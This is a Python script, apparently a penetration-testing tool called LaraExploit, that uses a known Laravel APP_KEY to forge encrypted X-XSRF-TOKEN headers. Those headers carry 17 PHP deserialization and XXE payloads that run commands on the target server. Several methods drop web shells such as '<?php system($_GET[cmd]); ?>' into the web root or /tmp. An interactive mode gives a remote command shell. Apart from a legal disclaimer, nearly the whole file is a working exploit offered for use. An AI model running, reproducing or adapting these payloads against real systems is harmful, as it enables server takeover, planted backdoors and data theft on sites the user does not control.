#!/usr/bin/env python3

# DISCLAIMER:
# This tool is for educational purposes and authorized penetration testing only.
# Unauthorized access to systems you do not own or have permission to test is illegal.

from rich.console import Console
from rich.panel import Panel
from rich.spinner import Spinner
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.table import Table
from Crypto import Random
from Crypto.Cipher import AES
from hashlib import sha256
from Crypto.Util.Padding import pad
import hmac
import base64
import json
import argparse
import requests
from signal import signal, SIGINT
from sys import exit
import time

console = Console()

# Colorful banner with vibrant colors
banner = """
[bold bright_red]
 â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¢€â£´â£¶â£¶â£¶â£¶â£¶â£¶â£¤â¡€â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â£€â£€â¢ â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â ¿â ƒâ£€â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â£¾â£¿â£¿â¡€â »â ¿â£¿â ¿â£¿â£¿â£¿â â£°â£¿â£¿â£·â£„â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¢€â£¾â£¿â£¿â£¿â£¿â£¶â¡†â €â €â €â €â ‰â €â »â£¿â£¿â£¿â£¿â£·â¡„â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¢¸â£¿â£¿â£¿â£¿â£¿â¡¿â ƒâ €â €â €â €â €â €â €â ™â ›â£‰â£­â£™â¢»â£†â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â£´â£¶â£¤â£‰â ›â£›â£‰â â €â €â¢€â£¤â£´â£¦â£¤â£€â£¶â¡†â£¾â£¿â£¿â£¿â£¯â ›â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¢ â£¿â£¿â£¿â£¿â£¿â£¿â¡â €â €â£°â Ÿâ ‰â ‰â ™â¢¿â£¿â£¿â£‡â¢»â£¿â£¿â£¿â£¿â †â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â ˆâ£¿â£¿â£¿â£¿â£¿â¡Ÿâ €â €â €â â €â €â €â €â¢¸â£¿â£¿â£¿â£¦â¡™â ¿â£¿â Ÿâ €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â ¿â¢‹â£©â£­â£‰â €â €â €â €â €â €â €â €â €â ˆâ£¿â£¿â£¿â£¿â£¿â£¿â¡–â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â£°â£¿â£¿â£¿â£¿â£·â£„â €â €â €â €â €â €â¢ â£´â¡¾â£¿â£¿â¡›â¢‹â ‰â£ â£„â¡€â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â£¿â£¿â£¿â Ÿâ£‰â£¤â£¶â£¤â£¤â¡€â €â €â£´â£¿â Ÿâ â£©â£¿â£¿â£¿â£¿â£¿â£»â£·â£„â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¢»â£¿â¢‡â£¾â£¿â£¿â£¿â£¿â£¿â£¿â¡†â ºâ ¿â ‹â¢€â£¾â£¿â¡¿â¢«â£¾â£¿â Ÿâ¢®â£â ¿â£·â¡„â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â¢€â£¶â£³â£¾â£·â¡„â €â ˆâ¢¿â¢¸â£¿â£¿â£¿â¡¿â£«â£¶â£¿â£¿â£¿â£·â£„â¢»â¡¿â¢‹â£´â£¿â£¿â Ÿâ£ â£´â¡¿â ·â£Ÿâ£¯â£¤â£¶â¡¶â£¶â£„â¡€â €â£€â£€â£€â €â €â €â €â €â €â €
â €â €â €â €â €â €â¢€â£ â£´â£¾â¡¿â ƒâ ˆâ ›â¢¿â£¦â£€â£ˆâ¡ˆâ¢¿â£¿â¡Ÿâ£¼â£¿â£¿â£¿â£¿â£¿â ¿â£›â£ƒâ£€â£˜â ¿â Ÿâ¢£â£¾â£¿â¡¿â ƒâ£´â£¿â£¿â£¿â£¿â£¿â¢¸â£¿â£¿â£¿â£¿â£¿â£¿â£¿â †â €â €â €â €â €
â €â €â €â €â¢€â£¾â£¼â¡¿â ‹â ‰â €â €â €â €â €â ˜â ¿â£¸â §â¡„â »â â£¿â£¿â£¿â£¿â¢â£´â£¿â£¿â£¿â£¿â£¿â£·â£„â¢»â¡Ÿâ ‹â €â£¼â£¿â£¿â£¿â ‹â ‰â µâ ¿â£¿â£¿â£¿â£¿â£¿â¢‹â£·â£¿â£¦â¡€â €â €â €
â €â €â €â €â£¼â£¿â ‹â €â¢ â£¶â£¶â£¶â£¾â£¿â£¿â£¿â£¿â£·â¡„â£¶â£¶â£†â£»â£¿â£¿â¢¯â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£‡â â£€â£ â£´â£®â¢»â ‡â €â£·â¡„â €â €â ¹â£¿â£¿â£·â£¿â£¿â£¿â£¿â£·â£¤â¡€â €
â €â €â €â €â£¿â¡‡â €â¢°â£¯â£½â ‰â ‰â¢©â£â£‰â£‰â£©â£­â£¥â£­â£â£»â£¥â£­â£­â£œâ ¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â ¿â¢›â¡¸â¢¿â£¿â£¿â¡¿â €â €â €â¢¹â£·â£€â£€â €â €â â¢¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£†
â €â €â¢€â£¼â ¿â ƒâ €â¢¸â£¿â¡‡â €â¢¸â£¿â »â Ÿâ ¿â ¿â ¿â ¿â¢¿â£¿â£¿â ‹â ›â£»â£­â£´â£¶â£„â ‰â ›â ¿â Ÿâ¢«â£¾â£¿â£¿â£†â£€â¡ˆâ €â €â €â €â €â ‰â ›â ‰â €â €â €â¢˜â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿
â£ â¡´â Ÿâ ›â â €â €â¢¸â£¿â¡§â €â£¾â£¿â¡€â €â¢ â£¼â¡»â£¿â£¿â£¿â£¿â£¿â£¿â â£¿â ¿â Ÿâ ƒâ£€â£´â£¿â£¿â ˆâ£™â¡»â ¿â ƒâ¢¾â£·â €â €â €â €â €â €â €â €â €â£ â£¾â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â Ÿ
â €â €â €â €â €â €â €â €â¢¿â¡‡â €â¢¿â£¿â¡‡â €â£¼â£¿â¡‡â ‰â ™â ›â ‹â ‰â €â €â €â €â €â£¾â¡›â »â£¿â¡‡â €â£¿â£§â €â €â ˜â â €â €â €â €â €â €â €â €â¢¸â£¿â£¿â£¿â ¿â ¿â ƒâ €â¢ â£¤â£´â¡†
â €â €â €â €â €â €â €â €â¢¸â£¿â¡‡â¢¸â£¿â¡‡â €â£¿â£¿â¡‡â €â €â €â£ â ¾â ›â¢¿â£¿â£·â£¿â£¿â£¿â£§â ¹â ƒâ €â ˆâ ‹â €â €â €â €â €â €â €â €â €â €â €â €â£¿â£¿â£¿â ‡â €â €â €â €â£¼â£¿â£¿â ƒ
â €â €â €â €â €â €â €â €â£ â£¿â ‡â¢¸â£¶â¡…â¢â¡¿â â €â €â €â¢€â£´â£¿â£·â¡Œâ ¿â ¿â ¿â ¿â ¿â Ÿâ €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¢¹â¡â €â €â €â €â¢€â£¤â£¿â£¿â ‹â €
â €â €â €â €â €â €â €â œâ ‹â €â €â €â¢»â£§â ˜â£¿â£¦â €â €â¢ â£¿â£¿â£¿â£¿â¡‡â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â â €â €â €â¢€â£¼â£¿â Ÿâ â €â €
â €â €â €â €â €â €â €â €â €â €â €â¢€â£´â¡â €â ˜â¢¿â£§â €â¢¸â£¿â£¿â£¿â£¿â£¿â£¶â¡„â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â ’â ›â ‹â â €â €â €â €
â €â €â €â €â €â €â €â €â €â €â €â¡¾â Ÿâ €â €â €â¢°â£¿â †â¢¸â£¿â£¿â£¿â£¿â¢¿â£¿â£§â£¤â£¶â£¶â£¦â£¤â£€â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â¢€â¡¾â ‹â €â¢¸â£¿â£¿â¡¿â£±â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£·â£¤â£ â£¤â£¤â£¤â£¤â£¶â£¶â£¤â£„â¡€â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â ˆâ €â €â €â ˆâ£¿â£¿â¢§â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â ¿â ¿â ¿â£·â¡€â €â €â €â €â €â €â €â €â €â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â ˜â¢¿â ‡â¢¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡¿â¢‹â£‰â ‰â »â ‹â â €â ‰â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â ˆâ »â£¿â£¿â£¿â£¿â£¿â ¿â ‹â¢°â£¿â£¿â£§â£¦â¡€â£€â£´â£¶â£¤â£´â †â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €
â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â ‰â ‰â â €â €â €â €â ™â ›â ¿â ¿â ¿â ¿â ¿â ›â ‹â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €â €
[/bold bright_red]

[bold bright_red]â–‘â–ˆâ–‘â–‘â–‘â–ˆâ–€â–ˆâ–‘â–ˆâ–€â–„â–‘â–ˆâ–€â–ˆâ–‘â–ˆâ–€â–€â–‘â–ˆâ–‘â–ˆâ–‘â–ˆâ–€â–ˆâ–‘â–ˆâ–‘â–‘â–‘â–ˆâ–€â–ˆâ–‘â–€â–ˆâ–€â–‘â–€â–ˆâ–€[/bold bright_red]
[bold bright_yellow]â–‘â–ˆâ–‘â–‘â–‘â–ˆâ–€â–ˆâ–‘â–ˆâ–€â–„â–‘â–ˆâ–€â–ˆâ–‘â–ˆâ–€â–€â–‘â–„â–€â–„â–‘â–ˆâ–€â–€â–‘â–ˆâ–‘â–‘â–‘â–ˆâ–‘â–ˆâ–‘â–‘â–ˆâ–‘â–‘â–‘â–ˆâ–‘[/bold bright_yellow]
[bold bright_green]â–‘â–€â–€â–€â–‘â–€â–‘â–€â–‘â–€â–‘â–€â–‘â–€â–‘â–€â–‘â–€â–€â–€â–‘â–€â–‘â–€â–‘â–€â–‘â–‘â–‘â–€â–€â–€â–‘â–€â–€â–€â–‘â–€â–€â–€â–‘â–‘â–€â–‘[/bold bright_green]
[bold bright_cyan]                                      V 05.25 [/bold bright_cyan]

[bold bright_cyan]â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•[/bold bright_cyan]
[yellow]âš¡ Powered by: [/yellow][bold bright_red]Taha Ishaq[/bold bright_red]
[yellow]ğŸ›  Developer: [/yellow][bold bright_cyan]Taha Ishaq[/bold bright_cyan]
[yellow]ğŸ” GitHub: [/yellow][bold bright_cyan]https://github.com/taha-isaq]
[bold bright_cyan]â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•[/bold bright_cyan]
"""

# Warning panel
def display_warnings():
    warning_text = (
        "[bold bright_red]âš  LEGAL WARNING âš [/bold bright_red]\n"
        "[white]This tool is for [bold white]EDUCATIONAL PURPOSES[/bold white] and [bold white]AUTHORIZED TESTING[/bold white] only.[/white]\n"
        "[white]Unauthorized access to systems without explicit permission is [bold bright_red]ILLEGAL[/bold bright_red].[/white]\n"
        "[white]Use responsibly and comply with all applicable laws.[/white]\n\n"
        "[bold bright_yellow]âš  SECURITY NOTICE âš [/bold bright_yellow]\n"
        "[white]Ensure the target system is under your control or you have written consent.[/white]\n"
        "[white]Misuse may lead to [bold bright_red]severe legal consequences[/bold bright_red].[/white]\n\n"
        "[bold bright_yellow]âš  NETWORK WARNING âš [/bold bright_yellow]\n"
        "[white]Rapid requests may trigger rate-limiting or server blocks. Use --skip-ssl if SSL issues occur.[/white]"
    )
    console.print(Panel(warning_text, title="[bold bright_red]ğŸš¨ IMPORTANT ğŸš¨[/bold bright_red]", border_style="bright_red", padding=(1, 2)))

def generate_payload(cmd, key, method=1, verbose=False):
    payload_type = "Deserialization"
    if method in [7, 8, 12, 13, 16]:
        payload_type = "Command Injection"
    elif method in [9, 14]:
        payload_type = "Shell Drop"
    elif method == 15:
        payload_type = "XXE"
    elif method == 17:
        payload_type = "Deserialization (PHPGGC)"
    if verbose:
        console.print(f"[bold bright_yellow]ğŸ“¦ Generating payload: [white]{cmd}[/white] (Method [cyan]{method}[/cyan], Type: [cyan]{payload_type}[/cyan])[/bold bright_yellow]")
        console.print(f"[bold bright_yellow]ğŸ“š Payload Source: [cyan]Inspired by PayloadsAllTheThings/PHPGGC[/cyan][/bold bright_yellow]")
    if method == 1:
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 2:
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:28:"Illuminate\\Events\\Dispatcher":1:{s:12:"' + "\x00" + '*' + "\x00" + 'listeners";a:1:{s:' + str(len(cmd)) + ':"' + cmd + '";a:1:{i:0;s:6:"system";}}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 3:
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":1:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:39:"Illuminate\\Notifications\\ChannelManager":3:{s:6:"' + "\x00" + '*' + "\x00" + 'app";s:' + str(len(cmd)) + ':"' + cmd + '";s:17:"' + "\x00" + '*' + "\x00" + 'defaultChannel";s:1:"x";s:17:"' + "\x00" + '*' + "\x00" + 'customCreators";a:1:{s:1:"x";s:6:"system";}}}'
    elif method == 4:
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:31:"Illuminate\\Validation\\Validator":1:{s:10:"extensions";a:1:{s:0:"";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 5:
        payload_decoded = 'O:45:"Illuminate\\Queue\\SerializableClosure":1:{s:10:"' + "\x00" + '*' + "\x00" + 'closure";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 6:
        payload_decoded = 'O:40:"Illuminate\\Auth\\Access\\Gate":1:{s:10:"' + "\x00" + '*' + "\x00" + 'abilities";a:1:{s:' + str(len(cmd)) + ':"' + cmd + '";s:6:"system";}}'
    elif method == 7:
        cmd = f"eval(base64_decode('{base64.b64encode(cmd.encode()).decode()}')) 2>/dev/null"
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 8:
        cmd = f"shell_exec('{cmd}') 2>/dev/null"
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 9:
        cmd = f"file_put_contents('/var/www/public/shell.php', '<?php system($_GET[cmd]); ?>')"
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 10:
        payload_decoded = 'O:36:"Illuminate\\Database\\Eloquent\\Model":1:{s:10:"' + "\x00" + '*' + "\x00" + 'attributes";a:1:{s:' + str(len(cmd)) + ':"' + cmd + '";s:6:"system";}}'
    elif method == 11:
        payload_decoded = 'O:31:"Illuminate\\Support\\MessageBag":1:{s:8:"' + "\x00" + '*' + "\x00" + 'messages";a:1:{s:' + str(len(cmd)) + ':"' + cmd + '";s:6:"system";}}'
    elif method == 12:
        cmd = f"passthru('{cmd}') 2>/dev/null"
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 13:
        cmd = f"proc_open('bash -c \"{cmd}\"', [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']], $pipes) 2>/dev/null"
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 14:
        cmd = f"file_put_contents('/tmp/shell.php', '<?php eval(base64_decode(\\'{base64.b64encode('system($_GET[cmd]);'.encode()).decode()}\\')); ?>')"
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 15:
        cmd = f"eval('{cmd}')"
        payload_decoded = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=eval://' + cmd + '">]><root>&xxe;</root>'
    elif method == 16:
        cmd = f"system(base64_decode('{base64.b64encode(cmd.encode()).decode()}')) 2>/dev/null"
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 17:
        payload_decoded = 'O:8:"stdClass":1:{s:3:"run";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    if verbose:
        console.print(f"[bold bright_yellow]ğŸ“¦ Payload Type: [cyan]{payload_type}[/cyan][/bold bright_yellow]")
    value = base64.b64encode(payload_decoded.encode()).decode('utf-8')
    key = base64.b64decode(key)
    if verbose:
        console.print(f"[bold bright_yellow]ğŸ”’ Encoded: [white]{value[:50]}...[/white][/bold bright_yellow]")
    return encrypt(value, key, verbose)

def encrypt(text, key, verbose=False):
    cipher = AES.new(key, AES.MODE_CBC)
    value = cipher.encrypt(pad(base64.b64decode(text), AES.block_size))
    payload = base64.b64encode(value)
    iv_base64 = base64.b64encode(cipher.iv)
    hashed_mac = hmac.new(key, iv_base64 + payload, sha256).hexdigest()
    data = {'iv': iv_base64.decode(), 'value': payload.decode(), 'mac': hashed_mac}
    if verbose:
        console.print(f"[bold bright_yellow]ğŸ” Encrypted: [white]{payload.decode()[:50]}...[/white][/bold bright_yellow]")
        console.print(f"[bold bright_yellow]ğŸ”‘ IV: [white]{iv_base64.decode()}[/white], MAC: [white]{hashed_mac[:20]}...[/white][/bold bright_yellow]")
    return base64.b64encode(json.dumps(data).encode()).decode()

def extractResponse(resp):
    return resp.split('<!DOCTYPE html>')[0]

def key_handler(signal_received, frame):
    console.print("[bold bright_red]ğŸ‘‹ Exiting... Stay safe! ğŸ‘‹[/bold bright_red]")
    exit(0)

def exploit(url, api_key, cmd, method=1, verbose=False):
    payload = generate_payload(cmd, api_key, method, verbose)
    if verbose:
        console.print(f"[bold bright_cyan]ğŸ“¡ Sending Request:[/bold bright_cyan]")
        console.print(f"[yellow]  Target: [white]{url}[/white][/yellow]")
        console.print(f"[yellow]  Payload: [white]{payload[:50]}...[/white][/yellow]")
    try:
        response = requests.post(url, headers={'X-XSRF-TOKEN': payload}, timeout=10, verify=not args.skip_ssl)
        if verbose:
            console.print(f"[bold bright_blue]  Status: [white]{response.status_code}[/white][/bold bright_blue]")
            console.print(f"[bold bright_blue]  Response Preview: [white]{response.text[:200]}...[/white][/bold bright_blue]\n")
        return response
    except requests.RequestException as e:
        if verbose:
            console.print(f"[bold bright_red]  Error: [white]{str(e)}[/white][/bold bright_red]\n")
        raise

def main():
    global args
    parser = argparse.ArgumentParser()
    parser.add_argument('URL', help="Laravel website URL to attack")
    parser.add_argument('API_KEY', help="Laravel website APP_KEY (base64)")
    parser.add_argument('-c', '--command', default='uname -a', help="Command to execute")
    parser.add_argument('-m', '--method', type=int, choices=range(1, 18), default=1, help="Payload method (1-17)")
    parser.add_argument('-i', '--interactive', action="store_true", help="Interactive shell")
    parser.add_argument('-v', '--verbose', action="store_true", help="Enable verbose output")
    parser.add_argument('-a', '--all', action="store_true", help="Test all payload methods")
    parser.add_argument('--skip-ssl', action="store_true", help="Skip SSL verification")
    args = parser.parse_args()

    console.print(banner)
    display_warnings()
    console.print("[bold bright_cyan]ğŸ”¥ LaraExploit Ready! ğŸ’¥[/bold bright_cyan]\n")

    if args.verbose:
        console.print(f"[bold bright_yellow]âš¡ Verbose Mode: [italic white]URL: {args.URL}, Command: {args.command}[/italic white][/bold bright_yellow]\n")

    # Custom spinners for each method
    spinners = ['dots', 'bouncingBar', 'arc', 'triangle', 'dots12', 'simpleDots', 'line', 'point', 'star', 'star2', 'flip', 'hamburger', 'growVertical', 'bounce', 'dots8Bit', 'aesthetic', 'bounce']

    if args.all:
        console.print("[bold bright_cyan]ğŸŒ© Testing All Payloads (Methods 1-17) ğŸŒ©[/bold bright_cyan]")
        console.print("[bold bright_yellow]â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•¡ Payloads â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•[/bold bright_yellow]\n")
        vulnerable_methods = []
        results_table = Table(title="[bold bright_cyan]ğŸ¯ Payload Results ğŸ› [/bold bright_cyan]", show_header=True, header_style="bold bright_yellow", border_style="bright_cyan")
        results_table.add_column("Method", style="cyan", justify="center")
        results_table.add_column("Status", style="yellow", justify="center")
        results_table.add_column("Output", style="white")

        for method in range(1, 18):
            console.print(f"[bold bright_yellow]ğŸ”¥ Method {method} Initiated ğŸ’¥[/bold bright_yellow]")
            with Progress(SpinnerColumn(spinner_name=spinners[method-1]), TextColumn("[cyan]âš¡ Connecting...[/cyan]"), BarColumn(), transient=True) as progress:
                task = progress.add_task("", total=100)
                for i in range(100):
                    progress.update(task, advance=1)
                    time.sleep(0.02)
                try:
                    resp = exploit(args.URL, args.API_KEY, args.command, method, args.verbose)
                    status_code = resp.status_code
                    console.print(f"[bold bright_green]âœ… Connected (Status: {status_code})[/bold bright_green]")
                except Exception as e:
                    console.print(f"[bold bright_red]âŒ Failed: {e}[/bold bright_red]")
                    results_table.add_row(str(method), "[bold bright_red]âŒ Failed[/bold bright_red]", str(e))
                    console.print("")
                    continue

            console.print(f"[bold bright_cyan]ğŸ”‘ APP_KEY: [yellow]{args.API_KEY[:20]}********[/yellow]")
            if any(x in resp.text for x in ["Linux", "www-data", "shell.php", "uid=", "gid="]):
                console.print(f"[bold bright_green]âœ… Method {method} is [underline]VULNERABLE[/underline]! ğŸ‰[/bold bright_green]")
                output = extractResponse(resp.text)
                results_table.add_row(str(method), "[bold bright_green]âœ… Vulnerable[/bold bright_green]", output[:50] + "..." if len(output) > 50 else output)
                vulnerable_methods.append(method)
            else:
                console.print(f"[bold bright_red]âŒ Method {method} is not vulnerable.[/bold bright_red]")
                results_table.add_row(str(method), "[bold bright_red]âŒ Not Vulnerable[/bold bright_red]", "-")
            console.print("")

        console.print(results_table)
        console.print("[bold bright_yellow]â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•¡ Summary â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•[/bold bright_yellow]\n")

        if vulnerable_methods:
            console.print(f"[bold bright_green]ğŸ‰ Vulnerable Methods: {vulnerable_methods} ğŸ‰[/bold bright_green]")
            if args.interactive:
                console.print(f"[bold bright_yellow]ğŸ’» Starting RCE Shell with Method {vulnerable_methods[0]} ğŸ’»[/bold bright_yellow]")
                console.print(f"[bold bright_yellow]âš¡ Interactive Mode - Press CTRL+C to exit âš¡[/bold bright_yellow]")
                console.print("[bold bright_cyan]â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•¡ Shell â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•[/bold bright_cyan]\n")
                signal(SIGINT, key_handler)
                while True:
                    cmd = console.input("[bold bright_green]â¤ [/bold bright_green]")
                    if len(cmd) == 0:
                        continue
                    resp = exploit(args.URL, args.API_KEY, cmd, vulnerable_methods[0], args.verbose)
                    console.print(f"[white]{extractResponse(resp.text)}[/white]\n")
        else:
            try:
                console.print("[bold bright_red]âŒ No vulnerable methods found.[/bold bright_red]")
            except Exception:
                console.print("âŒ No vulnerable methods found.")
        return

    # Normal mode (single method)
    console.print(f"[bold bright_yellow]ğŸ”¥ Testing Method {args.method} ğŸ’¥[/bold bright_yellow]")
    with Progress(SpinnerColumn(spinner_name="dots"), TextColumn("[cyan]âš¡ Connecting...[/cyan]"), BarColumn(), transient=True) as progress:
        task = progress.add_task("", total=100)
        for i in range(100):
            progress.update(task, advance=1)
            time.sleep(0.02)
        try:
            resp = exploit(args.URL, args.API_KEY, args.command, args.method, args.verbose)
            status_code = resp.status_code
            console.print(f"[bold bright_green]âœ… Connected (Status: {status_code})[/bold bright_green]")
        except Exception as e:
            console.print(f"[bold bright_red]âŒ Failed: {e}[/bold bright_red]")
            return

    console.print(f"[bold bright_cyan]ğŸ”‘ APP_KEY: [yellow]{args.API_KEY[:20]}********[/yellow]\n")
    if any(x in resp.text for x in ["Linux", "www-data", "shell.php", "uid=", "gid="]):
        console.print(f"[bold bright_green]âœ… Method {args.method} is [underline]VULNERABLE[/underline]! ğŸ‰[/bold bright_green]")
        console.print(f"[white]{extractResponse(resp.text)}[/white]\n")
    else:
        console.print(f"[bold bright_red]âŒ Method {args.method} is not vulnerable.[/bold bright_red]")
        return

    if args.interactive:
        console.print(f"[bold bright_yellow]âš¡ Interactive Mode - Press CTRL+C to exit âš¡[/bold bright_yellow]")
        console.print("[bold bright_cyan]â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•¡ Shell â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•[/bold bright_cyan]\n")
        signal(SIGINT, key_handler)
        while True:
            cmd = console.input("[bold bright_green]â¤ [/bold bright_green]")
            if len(cmd) == 0:
                continue
            resp = exploit(args.URL, args.API_KEY, cmd, args.method, args.verbose)
            console.print(f"[white]{extractResponse(resp.text)}[/white]\n")

main()
